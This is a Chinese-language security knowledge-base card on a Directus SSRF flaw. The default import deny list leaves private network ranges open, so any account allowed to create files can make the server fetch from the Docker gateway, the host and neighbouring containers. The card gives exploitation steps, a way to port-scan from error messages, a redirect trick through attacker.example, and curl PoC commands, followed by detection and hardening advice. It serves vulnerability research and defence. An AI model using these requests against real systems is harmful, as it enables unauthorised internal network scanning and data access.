---
id: web-generic-ssrf-directus-private-network-denylist-gap
title: Directus 默认 IMPORT_IP_DENY_LIST 不覆盖私有网段：文件导入 SSRF 打 Docker 网关、宿主机与同网服务
type: scenario
domain: web
path: web/generic/ssrf
technique: directus-import-ssrf-private-range-gap
tags:
- directus
- ssrf
- files-import
- private-network
- docker
- denylist
- redirect
- low-privilege
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V67
  verified_at: '2026-11-05T11:54:41+08:00'
  notes: 已对照原文全文与12张内联截图核对：默认名单 ['0.0.0.0','169.254.169.254']、Docker 172.20.0.3/网关 172.20.0.1、宿主机 10.1.0.3:8080、同网 PostgreSQL 172.20.0.2:5432 socket hang up、跨 bridge 172.17.0.2 ETIMEDOUT、公网 302 redirect 打穿、editor 仅 directus_files create 返回 204 且 uploaded_by 为 editor，均与原文一致。未验证点：未实际执行 PoC；Kubernetes 半径原文自述为推断未实测，卡内已注明；该缺口属默认配置问题，原文未给版本区间，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/generic/ssrf/web-generic-ssrf-directus-private-network-denylist-gap/
draft: false
kb_aliases:
- Directus 私有网段 SSRF
- IMPORT_IP_DENY_LIST 不拦内网
- Directus files/import 打内网
- Directus 网关 SSRF
- Directus redirect SSRF
---

## 一句话结论

Directus 的默认 `IMPORT_IP_DENY_LIST` 只覆盖 `0.0.0.0` 特殊处理（本机网卡、`0.0.0.0/8`、`::`）与 AWS metadata，`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16` 全部放行；任何具备 `directus_files` create 权限的账号都能通过 `/files/import` 让服务端访问 Docker 网关、宿主机映射端口、同网容器，并把响应存成文件。

## 原理

- `/files/import` 的 `url` 参数原样交给 axios，唯一防线是自定义 agent 上的 `IMPORT_IP_DENY_LIST` 黑名单；默认值只有 `['0.0.0.0', '169.254.169.254']`。
- `0.0.0.0` 经特殊处理等价于“本机所有网卡 IP + `0.0.0.0/8` + `::`”（12.0.0 起），`169.254.169.254` 是 AWS metadata；除此之外没有私有网段规则。默认防护的真实覆盖面是本机回环、本机网卡和 AWS metadata。
- Docker 部署下这个缺口很现实：Directus 容器在 `172.20.0.3`，网关 `172.20.0.1`；`addLocalNetworkInterfaces` 只把容器自己的网卡加进黑名单，同网络其他容器、网关、宿主机都不在名单里。
- 容器访问网关 IP 走默认路由，不需要跨 bridge 转发；宿主机上监听 `0.0.0.0:8080` 的服务因此可通过 `172.20.0.1:8080` 直达。同网络的 PostgreSQL `172.20.0.2:5432` 也能建立 TCP 连接。跨 Docker bridge 的 `172.17.0.2` 则被网络隔离挡成 `ETIMEDOUT`。
- 错误类型可以当端口扫描器：日志为 `resolves to a denied IP address` 表示被黑名单拦；`connect ETIMEDOUT`/`connect ECONNREFUSED` 表示网络不通或端口关闭；`socket hang up` 表示 TCP 握手成功、对端收到非协议数据后断开，即端口开放。
- redirect 变体：axios 默认跟随最多 5 跳重定向，每跳都会重新走 IP 校验。用公网 302 服务把 `Location` 指向私有网段，可以打穿；指向 `127.0.0.1`/`0.0.0.0` 仍会被拦。它的价值是隐藏内网目标——日志里只出现公网 URL，利用的仍是私有网段不在黑名单这个根因。
- 权限边界：`/files/import` 只需要 `directus_files` 的 create 权限。原文用只具备该权限的 content-editor 角色实测，返回 204，文件成功入库且 `uploaded_by` 为 editor；管理员在文件列表能看到 editor 创建的内网响应文件。

## 触发条件

- Directus 使用默认或未补全私有网段的 `IMPORT_IP_DENY_LIST`。
- 攻击者持有 `directus_files` create 权限的账号（管理员或内容编辑）。
- Directus 容器/主机能访问目标私有网段（Docker 网关、宿主机 eth0、同网服务、Kubernetes pod 网络等）。
- redirect 变体还需要攻击者控制一个可返回 302 的公网服务，或能找到可控制重定向的站点。

## 利用步骤

1. 登录取 token（低权限 editor 即可，只要具备 `directus_files` create）。
2. 用 `/files/import` 逐个探测目标：网关 `http://172.20.0.1:<port>/`、宿主机内网 IP `http://10.1.0.3:<port>/`、同网容器 `http://172.20.0.2:<port>/`。
3. 根据响应与日志错误类型判断：200 表示拉取成功；`socket hang up` 表示 TCP 通但协议不匹配（端口开放）；`ETIMEDOUT`/`ECONNREFUSED` 表示不通。
4. 对返回 200 的服务读回文件内容，做服务指纹（如 NocoDB 健康检查、HTML 中的 `/_nuxt/`、`nocodb-sdk`）。
5. redirect 变体：在公网服务上配置 302 指向私有网段目标，import 公网 URL，日志只留公网地址。
6. 若目标是云环境，继续检查国产云 metadata 地址（另见关联卡）。

## PoC

```bash
# 登录取 token（editor 或 admin）
TOKEN=$(curl -s -X POST http://target:8055/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"editor@example.com","password":"***"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["access_token"])')

# 打 Docker 网关上的 NocoDB
curl -s -X POST http://target:8055/files/import \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"http://172.20.0.1:8080/api/v1/health"}'

# 打宿主机 eth0 内网 IP
curl -s -X POST http://target:8055/files/import \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"http://10.1.0.3:8080/api/v1/health"}'

# 探测同网 PostgreSQL：日志出现 socket hang up 表示 TCP 可达
curl -s -X POST http://target:8055/files/import \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"http://172.20.0.2:5432/"}'

# redirect 变体：公网 302 -> 私有网段
curl -s -X POST http://target:8055/files/import \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"http://attacker.example:8099/r2"}'
```

```text
# 预期：200 并生成文件记录；读回 /assets/<id> 得到内网服务响应
# PostgreSQL 探测日志：WARN: Couldn't fetch file from URL "http://172.20.0.2:5432/": socket hang up
```

## 变体与关联

- 变体：Docker 网关是直达宿主机的桥；宿主机上监听 `0.0.0.0` 的端口都能从容器经网关访问。
- 变体：Kubernetes 部署时 pod 网络内所有服务对 pod 可达，SSRF 半径覆盖整个集群（原文按网络模型推断，未实测）。
- 变体：redirect 中转可隐藏内网地址；但每跳都重新校验，不能绕过已列入黑名单的回环/metadata。
- 变体：低权限 editor 仅需 `directus_files` create，返回 204 无响应体，但文件已入库，管理员可见 `uploaded_by`。
- 关联：[[web-generic-ssrf-directus-cve-2026-61835-zero-ip-bypass]]（同一入口的 0.0.0.0 绕过）、[[web-generic-ssrf-directus-default-denylist-domestic-cloud-metadata]]（同一默认名单不覆盖国产云 metadata）、[[web-generic-ssrf-directus-anonymous-webhook-flow-request]]（同一 axios 防护被匿名 Flow 复用）、[[web-generic-ssrf-cloud-metadata]]。
- 边界：管理员已把 RFC1918 网段加入 `IMPORT_IP_DENY_LIST`、网络层做了出站隔离、`directus_files` create 权限未授予非管理员、`/files/import` 被禁用时，本场景不成立。

## 检测与防御

- 检测：审计 `/files/import` 的 `url` 是否指向 `10./172.16-31./192.168.`、Docker 网关或宿主机内网 IP；关注 `socket hang up`、`ETIMEDOUT` 等探测型错误；关注低权限账号集中创建文件及 `uploaded_by`。
- 检测：出站流量中出现应用服务器访问私有网段、Docker 网关、宿主机映射端口；公网 302 跳转到内网地址的请求链。
- 防御：把 `IMPORT_IP_DENY_LIST` 补全为 `0.0.0.0,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,169.254.0.0/16,169.254.169.254`；对 import 目标做协议/域名白名单，禁止跟随不可信重定向或在跳转后重新校验最终 IP。
- 加固：最小化 `directus_files` create 权限；Directus 容器与业务容器网络隔离，宿主机不暴露不必要端口；在出口层阻断私有网段与 metadata；升级到最新版本不能替代补全名单。
